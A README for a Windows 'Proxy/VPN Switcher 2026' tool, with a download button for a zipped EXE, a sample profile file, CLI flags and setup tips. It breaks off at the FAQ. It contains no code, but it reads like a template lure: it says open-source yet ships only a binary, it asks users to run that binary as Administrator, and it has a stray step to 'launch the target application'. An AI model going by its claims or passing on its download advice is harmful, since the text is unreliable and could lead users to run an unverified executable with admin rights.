<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=12&height=220&section=header&text=Proxy/VPN+Switcher+2026&fontSize=62&fontColor=fff&animation=fadeIn&fontAlignY=38&desc=Smart+Proxy+%26+VPN+Switcher+Tool+2026&descAlignY=56&descSize=20" width="100%"/>

# Proxy/VPN Switcher 2026 🧩 ⚙️

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge)
![Updated](https://img.shields.io/badge/updated-2026-brightgreen?style=for-the-badge)
![Stars](https://img.shields.io/github/stars/KnotMistDawn79/proxy-vpn-switcher?style=for-the-badge&logo=github)
![Forks](https://img.shields.io/github/forks/KnotMistDawn79/proxy-vpn-switcher?style=for-the-badge&logo=github)
![Last Commit](https://img.shields.io/github/last-commit/KnotMistDawn79/proxy-vpn-switcher?style=for-the-badge)
![Repo Size](https://img.shields.io/github/repo-size/KnotMistDawn79/proxy-vpn-switcher?style=for-the-badge)
![Platform](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows)
![Windows EXE](https://img.shields.io/badge/Windows-EXE-0078d4?style=for-the-badge&logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

### ⭐ Star this repo if it helped you!

<p align="center">
  <a href="https://github.com/KnotMistDawn79/proxy-vpn-switcher/releases/download/v2.0.11/proxy-vpn-switcher-v2.0.11.zip">
    <img src="https://img.shields.io/badge/⬇%20DOWNLOAD%20Proxy/VPN Switcher%202026-FF6600?style=for-the-badge&logoColor=white&labelColor=DD3300" width="420" alt="Download Proxy/VPN Switcher 2026"/>
  </a>
</p>

</div>

## 📋 Table of Contents

- [📖 About](#-about)
- [⚙️ Requirements](#️-requirements)
- [✨ Features](#-features)
- [🔧 Configuration](#-configuration)
- [💻 CLI Usage](#-cli-usage)
- [📦 Installation](#-installation)
- [📊 Compatibility](#-compatibility)
- [Common Mistakes & Pitfalls](#common-mistakes--pitfalls)
- [💬 Community & Support](#-community--support)
- [📜 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)

---

## 📖 About

Proxy/VPN Switcher 2026 is a lightweight, open-source utility that lets you instantly switch between proxy servers and VPN connections with a single click. Designed for developers, privacy enthusiasts, and power users who need to rotate IPs, bypass geoblocks, or test network configurations — all from one clean Windows-native interface. No bloat, no background services, just reliable network switching.

## ⚙️ Requirements

- Windows 10 1809 or later / Windows 11
- 100 MB free disk space
- Internet connection for proxy/VPN list updates
- Administrator privileges (for network interface changes)
- .NET Framework 4.8 or higher (included on most modern Windows builds)

## ✨ Features

- **One-Click Switch** 🔀 — Quickly toggle between saved proxy profiles or VPN connections from the system tray or main window.
- **Multi-Protocol Support** 🌐 — SOCKS4/5, HTTP(S), OpenVPN, WireGuard, and IKEv2 — all in one tool.
- **Profile Manager** 🗂️ — Save, import, export, and organize dozens of proxy/VPN presets with custom names and tags.
- **Auto-Rotation Engine** 🔄 — Set an interval to automatically rotate through your proxy list (30s–60min) for scraping or testing.
- **Latency Tester** ⏱️ — Ping all proxy endpoints and see real-time response times before connecting.
- **System Tray Integration** 🖥️ — Minimal tray icon with right-click context menu for quick actions. Never loses connection state.
- **Kill Switch** 🔒 — Blocks all non-VPN traffic if the connection drops unexpectedly. Privacy-first guarantee.
- **Log Viewer** 📝 — Full connection logs with timestamps, protocols, and error messages — no silent failures.

## 🔧 Configuration

Proxy/VPN Switcher 2026 stores profiles in a `profiles.json` file inside the application directory. You can edit this manually or use the built-in GUI.

```json
{
  "profiles": [
    {
      "name": "US East - HTTP",
      "type": "http",
      "host": "192.168.1.100",
      "port": 3128,
      "auth": true,
      "user": "myproxyuser",
      "pass": "mypassword"
    },
    {
      "name": "EU West - WireGuard",
      "type": "wireguard",
      "configPath": "C:\\VPN\\wg0.conf"
    },
    {
      "name": "Rotating SOCKS5",
      "type": "socks5",
      "host": "rotating.proxy.service",
      "port": 1080,
      "auth": true,
      "user": "user-rotate",
      "pass": "pass123"
    }
  ]
}
```

### Flags Available

| Flag            | Description                          |
|-----------------|--------------------------------------|
| `--connect`     | Connect to a profile by name         |
| `--disconnect`  | Disconnect current interface          |
| `--list`        | List all saved profiles                |
| `--rotate`      | Start auto-rotation every N seconds   |
| `--json <file>` | Load configuration from custom JSON   |

## 💻 CLI Usage

All features are accessible from the command line for scripting and automation.

```bash
# List available profiles
proxy-vpn-switcher --list

# Connect to a specific profile
proxy-vpn-switcher --connect "US East - HTTP"

# Start rotation every 5 minutes (300 seconds)
proxy-vpn-switcher --rotate 300

# Load profiles from a custom file
proxy-vpn-switcher --json C:\work\network-config.json --connect "Dev Proxy"
```

For batch scripting (PowerShell):

```powershell
.\proxy-vpn-switcher.exe --disconnect
.\proxy-vpn-switcher.exe --connect "EU West - WireGuard"
```

## 📦 Installation

1. Go to the [Releases](../../releases/latest) page and download the latest version.
2. Extract the archive if needed.
3. Run the downloaded executable as Administrator.
4. Follow the on-screen setup steps.
5. Launch the target application and enjoy.

## 📊 Compatibility

| OS                        | Version          | Status | Notes                                           |
|---------------------------|------------------|--------|-------------------------------------------------|
| Windows 10                | 1809+            | ✅     | Full support, including features. Recommended.  |
| Windows 11                | 21H2+            | ✅     | Fully compatible. Tested on all builds.         |
| Windows 10                | 1803 and older   | ⚠️     | Some features may be limited (rotation engine). |
| Windows Server 2019+      | All              | ✅     | Works with Administrator privileges enabled.    |
| Windows 11 ARM (emulated) | 23H2+            | ⚠️     | Runs under x64 emulation but very stable.       |
| Linux / macOS             | —                | ❌     | Windows-only executable. WINE not recommended.  |

## Common Mistakes & Pitfalls

**🔴 Running without Administrator privileges —**
The most frequent issue. Connection switching requires elevation. Always right-click → "Run as Administrator", or the Kill Switch feature will silently fail.

**🔴 Conflicting VPN services —**
If another VPN client (NordVPN, ExpressVPN, etc.) is already running, Proxy/VPN Switcher may fail to modify network interfaces. Close all other VPN software before using the switcher.

**🔴 Forgetting to save profiles after manual config edits —**
Editing `profiles.json` while the app is running will overwrite your changes on exit. Quit the app, edit the file, then restart.

**🔴 Overly aggressive rotation intervals —**
Setting rotation every 10 seconds with 20+ proxies may trigger rate limits on your proxy provider and cause temporary bans. Keep intervals above 60 seconds for consumer proxies.

**🔴 Kill Switch not engaging on first launch —**
The firewall rule for Kill Switch is set the first time you connect to a WireGuard/OpenVPN profile. If you click "Enable Kill Switch" before any connection is made, it does nothing. Connect first, then enable.

## ❓ FAQ

**Q: